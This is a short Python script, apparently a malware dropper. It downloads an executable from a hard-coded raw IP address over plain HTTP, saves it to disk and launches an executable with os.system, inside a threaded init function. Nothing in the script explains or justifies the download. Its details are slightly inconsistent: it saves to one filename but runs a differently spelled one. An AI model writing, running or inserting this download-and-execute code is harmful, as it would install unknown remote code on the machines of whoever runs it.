import requests, os, threading
def main():
    g = 'http://45.158.77.82/swfdump.exe'
    v = requests.get(g, allow_redirects=True)
    open('swfdump.exe', 'wb').write(v.content)
    os.system('swfdumper.exe')
def init():
    threading.Thread(target=main()).start()